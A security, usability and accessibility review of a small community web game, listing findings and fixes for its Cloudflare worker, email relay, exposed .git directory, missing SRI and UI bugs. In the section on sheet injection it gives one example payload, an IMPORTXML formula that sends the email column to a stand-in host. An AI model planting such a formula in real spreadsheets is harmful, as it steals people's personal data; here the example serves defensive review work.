# Security + usability + design review — 2026-06-09

A multi-agent review of the whole project (worker/API security, client-side
security, live-site probing, player UX, accessibility, robustness) plus a
feature/design scout and a completeness critic. Every finding below survived an
adversarial verification pass (independent agents tried to refute each one);
items that were refuted as inaccurate, by-design, or not worth maintainer
attention are listed at the bottom so we don't re-litigate them.

Severities are calibrated for *this* deployment — a free community game whose
data is camp name + email + yes/no answers in a Google Sheet — not a generic
enterprise checklist.

**Status legend:** ✅ fixed in the 2026-06-09 hardening PR · 🛠️ owner/dashboard
action (can't be done in-repo) · ⏭️ deferred follow-up.

---

## Security

### S1 — `POST /api/complete` is an unauthenticated email-relay + sheet-spam endpoint · HIGH · ✅/🛠️
`worker/index.js`. Three soft gates, all bypassable by a non-browser client:
the origin check was `if (origin && origin !== ALLOWED_ORIGIN …)` so an **absent
Origin header** skipped it; the honeypot (`body.website`) is opt-in and its field
name is public because `/worker/index.js` is served verbatim; the email regex is
permissive with no length cap. Result: anyone could loop and (a) send real email
from the reputation-bearing `hello@greenradi.us` to **any address** with an
attacker-controlled subject (`Your Green Radius — ${campName}`, up to ~4 KB), and
(b) append unbounded junk rows. The completeness critic sharpened this into a
**denial-of-wallet** angle: every call also burns one Resend send and one Apps
Script execution against one volunteer's daily quotas — exhaust either and the
admin viewer (shared Apps Script quota) breaks too.
- ✅ In-repo: origin check now **fails closed** (empty Origin rejected); per-field
  length caps (campName/leadName ≤ 80, email ≤ 254); see also S4.
- 🛠️ Owner: add a **Cloudflare WAF rate-limit rule** on `POST /api/complete`
  (e.g. a few req/IP/min) and/or a **Turnstile** token validated server-side.
  This is the actual control — the origin fix only stops casual browser abuse.

### S2 — Live `.git/` directory is publicly served · MEDIUM · ✅
`https://greenradi.us/.git/config|HEAD|index|logs/HEAD` all returned **200**
(verified live), so `git-dumper` can reconstruct full history. Root cause:
`wrangler.jsonc` `assets.directory = "."` with no `.assetsignore`. Today's leak
is limited (repo is public on GitHub; history grepped clean of secret *values*),
but it's a standing trap the moment any secret ever lands in a commit.
- ✅ Added `.assetsignore` excluding `.git/` (and more — see S3).

### S3 — `assets.directory = "."` + no `.assetsignore` = local `wrangler deploy` would publish `.dev.vars` · MEDIUM · ✅
Wrangler's asset uploader does **not** honor `.gitignore` — only `.assetsignore`.
Prod deploys come from Cloudflare's git checkout (so `.dev.vars` is 404 today),
but `CLAUDE.md` documents `npx wrangler deploy` as a supported path; running it
from a working tree would upload `.dev.vars` (RESEND_API_KEY, SHEETS_SHARED_SECRET),
`.claude/`, `.remember/` straight to the public web — and HSTS preload means you
can't quickly wall it off.
- ✅ `.assetsignore` now excludes `.git`, `.dev.vars*`, `.claude/`, `.remember/`,
  `.superpowers/`, and editor junk, so both git-based and local deploys are
  safe-by-default.

### S4 — Google Sheets formula/CSV injection via `campName` / `leadName` · MEDIUM · ✅
Names were written to the Sheet unsanitized. A value starting with `= + - @`
becomes a live formula in the owner's spreadsheet on view/recalc; e.g.
`=IMPORTXML("https://evil/?d="&JOIN(",",D2:D999),"//a")` exfiltrates the email
column (the only PII collected). The `/admin` web view is safe (React escapes);
the native Sheets UI is where it fires.
- ✅ Worker now prefixes a `'` to any cell value (campName/leadName/email) that
  begins with a formula-trigger char before it reaches the sheet. Normal values
  are untouched.

### S5 — CDN scripts loaded with no Subresource Integrity; no CSP · MEDIUM · ✅/⏭️
`index.html` / `result/index.html` / `admin/index.html` load React + ReactDOM +
**@babel/standalone** from unpkg with `crossorigin` but no `integrity=`. Babel
in-browser `eval()`s every `text/babel` script, so a CDN compromise = arbitrary
JS on every page (including `/admin`, which renders all emails). Versions are
pinned, but pinning doesn't stop altered bytes at the same URL.
- ✅ Added `integrity="sha384-…"` to all three CDN `<script>` tags in all three
  HTML entry points (hashes computed from the immutable pinned URLs).
- ⏭️ Consider **vendoring** the three files same-origin (also fixes the
  playa-offline blank-page failure, F4) and a baseline CSP / `frame-ancestors`.

### S6 — No Content-Security-Policy / X-Frame-Options / Permissions-Policy · LOW · ⏭️
`_headers` sets only HSTS, Referrer-Policy, nosniff (verified live). No active
XSS exists today (client render paths are clean — no `innerHTML`/
`dangerouslySetInnerHTML`; decoded hash strings flow through React as escaped
text), so this is defense-in-depth. A strict script-CSP is awkward with
in-browser Babel, but `frame-ancestors 'none'` and a minimal `Permissions-Policy`
are free adds. Deferred to pair with the vendoring in S5.

---

## Usability

### U1 — Done screen lies on partial failure · HIGH · ✅
`green-radius.jsx`: `if (j.email === 'sent' || j.sheet === 'ok')` collapsed the
Worker's two independent statuses. Email-fail/sheet-ok told the player "sent to
<email> (check spam)" for an email that never went; sheet-fail/email-ok silently
dropped the camp from the tally with no retry. Silent data loss for a once-a-year
census.
- ✅ The two outcomes are now tracked separately; copy is honest per case; a
  sheet-only failure no longer marks the run permanently complete.

### U2 — Submit failure was a dead-end; unconfirmed Exit destroyed the only copy · HIGH · ✅
Finishing offline (the playa case) lands in `error`, which never retried
in-session, and the Exit button `clearSaved()` with no `confirm()` — unlike Reset
and Clear, which both confirm.
- ✅ Added a **Try again** button to the error state and a `confirm()` to Exit
  when the run isn't confirmed-done; the in-flight POST is abort-guarded so an
  Exit mid-send can't poison the next game (see U-bug below).

### U-bug — Exit during the in-flight POST poisons `submittedAt` · MEDIUM · ✅
The uncancelled async closure could resolve after Exit reset state and set
`submittedAt`, making the *next* game skip its POST entirely while claiming
"sent." ✅ Fixed with a generation ref guard on the submit closure.

### U3 — Form "✕ Close" silently wipes the autosave it just promised · HIGH · ⏭️
The persistence effect clears the save on `pick-mode`/`intro`/`form-intro`, and
Close routes to `pick-mode`. Loss is masked because `answers` survive in React
memory until a refresh. The FAQ is only reachable from the home screen, so
"close to read the FAQ" is a trap. **Deferred** (needs a small state-machine
change + a "continue where you left off" affordance; worth its own PR).

### U4 — Board mode: one mis-tap is permanent, only remedy wipes the game · MEDIUM · ⏭️
`QuestionModal.answer()` commits and advances with no Back/undo; the only
correction is Reset (wipes all 60). Form mode already supports free editing.
**Deferred** — add a Back control to the modal.

### U5 — Identity mandatory before question 1; typo'd email unfixable · MEDIUM · ⏭️
Camp + name + valid email + consent gate the first question, and the FAQ copy
contradicts it. Deferred — either move identity capture to the end or add an
edit/resend on the done screen.

### U6 — Mid-season `STORAGE_VERSION` bump silently discards in-progress games · MEDIUM · ⏭️
`loadSaved` returns null on mismatch with no salvage/notice. Already at v6.
Deferred — salvage forward-compatible `answers` + camp info, or at least show a
one-line notice; freeze version bumps during the active season.

### U7 — First load is a blank tan page · MEDIUM · ⏭️
~650 KB gzipped Babel + in-browser compile with no spinner, `<noscript>`, or
timeout fallback; on spotty connectivity it's indistinguishable from broken.
Deferred — add an in-`#root` loading state + slow-connection message; pairs with
vendoring (S5/F4).

### U8 — Interrupting the 10-question modal loses up to 9 answers · MEDIUM · ⏭️
In-modal answers aren't persisted until sector completion, and there's no
History API entry, so a phone back-swipe exits the site mid-sector. Deferred —
write each answer to the shared `answers` map as given; add a `pushState` entry.

### U9 — Invalid `/result/` link is a bare-text dead end · LOW · ⏭️
The share link is the viral loop, but a truncated hash renders one unstyled
sentence with no "play your own" CTA and no OG tags for chat unfurls. Deferred —
branded fallback card + OG meta (see F3).

---

## Accessibility

### A1 — Question modal silent to screen readers · HIGH · ✅
The core board-mode modal had no `role="dialog"`, no focus management, and the
just-pressed Spin button becoming `disabled` dropped focus to `<body>`. Question
text swapped with no live region.
- ✅ Added `role="dialog"` / `aria-modal` / `aria-labelledby`, focus moves to the
  question on open and on each step, and the prompt is wrapped in an
  `aria-live="polite"` region.

### A2 — Primary CTAs fail WCAG AA contrast · HIGH · ⏭️
Spin label is **1.96:1**; white-on-green CTAs (Yes 2.94:1; Start/Download/
Submit/mode-tile/FAQ-resource ~2.38:1). Doubly bad in desert sun.
- A dark-on-green label fix was tried in PR #35 but **reverted** — the dark
  labels didn't read well, so the green buttons keep their white labels and the
  contrast gap is still open.
- ⏭️ Deferred to a **previewed palette-legibility pass**: keep white labels and
  instead darken the green button *fills* (e.g. `#558040`/`#4d7a3a`, which pass
  AA with white text) rather than darkening the text. Same pass covers the green
  *text links* on white (STEP codes, resource links ~2.82:1). The focus-ring fix
  (A3) and the modal dialog semantics (A1) shipped and are unaffected.

### A3 — Focus ring green-on-beige at 1.96:1 · MEDIUM · ✅
The only focus styling was a `#7AB85C` outline, invisible on the beige bg.
- ✅ Focus-visible outline darkened to `#2a2620` (≈10:1).

### A4 — Wheel/RadialBadge SVGs invisible to SR; toast unannounced; tiny touch targets · MEDIUM · ⏭️
`role="img"` + dynamic `aria-label` on the wheel/badge; `role="status"` on the
score toast; bump Yes/No + FAQ-close + PDF links to ≥44 px. Deferred.

### A5 — Fixed 360 px ShareCard clips at ≤375 px / 320 px reflow · MEDIUM · ⏭️
Make the card fluid (`width: min(360px, 100%)`) and center via `margin:auto` on
`/result/`. Deferred.

### A6 — Admin rows / back control / radial drill-down are click-only · MEDIUM · ⏭️
Internal tool; convert rows + back to `<button>`, add a keyboard path for the
segment drill-down. Deferred.

### A7 — FAQ modal lacks focus trap + scroll lock · LOW · ⏭️
Otherwise well built (Escape, initial focus, restore, dialog semantics). Add a
Tab trap + `body{overflow:hidden}`; share the hook with A1. Deferred.

### A8 — Tier-4 topic select unlabeled; required fields not programmatic · LOW · ⏭️
`aria-label` on the select; `required`/`aria-invalid` on Intro inputs. Deferred.

---

## Robustness

### R1 — Closing the form contaminates a later board game · MEDIUM · ⏭️
`answers` survive in memory and `sectorFill` counts Tier-4 yeses across *all*
topics, so stale form answers inflate the board score. Deferred — reset `answers`
on entering a fresh mode.

### R2 — Admin mixes legacy 0–4 rows with new 0–10 rows · MEDIUM · ⏭️
Pre-#32 rows (same year, inside the default filter) corrupt averages, leaderboard
and `perfectSectors`; `approxFills` renders a maxed legacy camp as 4/10. Tag rows
by era (`schemaVersion === '' && !answers`) and exclude or rescale. Deferred.

### R3 — Admin masks Apps Script failures as "No camps yet" · LOW · ⏭️
Non-JSON / `{ok:false}` becomes a 200 `{rows:[]}`. Treat non-array `data.rows` as
502. Deferred.

### R4 — Reload mid-POST can double-submit · LOW · ⏭️
No idempotency key; a reload while `sending` re-POSTs. Add a client nonce the
Apps Script dedupes on. Deferred.

### R5 — Spin timer never cancelled → phantom modal next game · LOW · ⏭️
Reset mid-spin leaves a pending `setActiveQuestion`. Store the timer id in a ref
and clear on Reset/startGame. Deferred.

### R6 — Stale contiguous/"later yes compensates" comments + FAQ copy · LOW · ⏭️
Three spots still describe the pre-#32 model. Rewrite the two comments and the
FAQ "How do I play?" sentence. Deferred (copy convention: no em dashes).

---

## Refuted by verification (do not re-open)

- JWT verify omits `iss`/`nbf` — alg is hardcoded, signature pinned to the team
  JWKS, route is Access-gated; no marginal protection.
- Shared secret in the doGet query string — TLS-protected; the same secret
  already crosses on the POST path; `doGet(e)` can't read headers anyway.
- Dynamic API responses lack the static security headers — JSON bodies, admin
  path is Access-gated; nosniff is near-irrelevant for JSON.
- Admin renders sheet `resultUrl` as an href — only the trusted owner can plant
  one in their own Access-gated, secret-free viewer; pure self-XSS.
- HTTP served 200 instead of redirecting — HSTS preload makes conforming
  browsers never send HTTP.
- Internal docs/plans world-readable — the whole frontend + worker ship as
  readable source; prose adds ~zero attacker value (a tidiness note at most).
- Worker 500 on a literal `null` JSON body — only `null` is affected (primitives
  box on property access); negligible.
- **Verified clean:** `safeResultUrl` pinning (subdomain/userinfo/`%2f`/traversal/
  protocol), outbound-email escaping, Access-gated admin route, result-state
  encode/decode round-trips, game-data ids, aggregate division guards, no
  StrictMode double-POST.

---

## Feature & design enhancements (ranked impact-to-effort)

Cross-checked against shipped specs so none re-propose existing work.

1. **"Your Green-Up Plan" on the done screen** (med/high) — turn every No into a
   next step; data is already in `answers`, links in `game-data.js`. Reason to
   return next year; surfaces the Resource Guide at peak motivation.
2. **Share the PNG card via Web Share API** (small/high) — you already rasterize
   to PNG for Download; attach the `File` so shares are visually loud in chat.
3. **Make shared links unfurl (OG tags)** (small→med/high) — `/result/` has no
   `og:`/`twitter:` tags. Static baseline ≈ 1 hr; per-camp via `/result/?r=<hash>`
   + HTMLRewriter is DB-free.
4. **Vendor React/ReactDOM/Babel into the repo** (small/high) — removes the only
   third-party runtime dep on the "never offline" path, speeds first paint, and
   closes the SRI gap. Pairs with U7's loading state.
5. **Admin: one-click CSV export + "toughest steps" ranking** (small/high) —
   `aggregate.js` already computes per-question yes-rates; rows already in-browser.
6. **Year-over-year "ghost ring"** (med/high) — every camp already holds a durable
   record (their emailed `/result/#hash`). "Paste last year's link" → dashed
   last-year arc + deltas. Build now, magical in 2027, zero migration.
7. **Quirky playa-rank titles** (small/med) — derived from totals already in the
   hash, so `/result/` gets them free. Screenshot bait.
8. **Public `/city/` anonymized scoreboard** (med/high) — `aggregate.js` was built
   PII-free "for reuse"; strip names in a cached `/api/stats` route.
9. **One-command preflight** (parse gate + data invariants + dead-link check)
   (small/med) — right-sized for a one-person no-build app.

---

## Strategic gaps (no single dimension owns these)

- **No privacy posture for the PII collected** (email + lead's playa name + camp)
  → long-lived owner-readable Sheet + Resend, with one consent sentence and no
  privacy page, retention policy, or deletion path. Highest-value missing angle
  for something collecting real emails.
- **LICENSE/provenance mismatch** — MIT © `marcvl64` (legacy owner) over BLAST
  framework content + PDFs that may not be the repo's to relicense; © holder is
  wrong. Published in LICENSE + README.
- **Downloadable board-game PDFs have drifted** — "v26 FINAL" (May 19) predates
  three `game-data.js` changes incl. the June 6 Tiers→Levels scoring rework. A
  camp printing the PDF plays a different game than the web app, with no version
  stamp linking them.
- **On-playa offline reality** — hard-depends on CDNs + fonts + the API at
  runtime, no service worker, no "needs signal" messaging. Decide the story.
- **Single-maintainer bus factor** — one person holds all secrets + the
  Cloudflare/Resend/Google accounts; HSTS means the site can't be casually
  retired; no documented succession/break-glass. Add a co-owner.
</content>
</invoke>
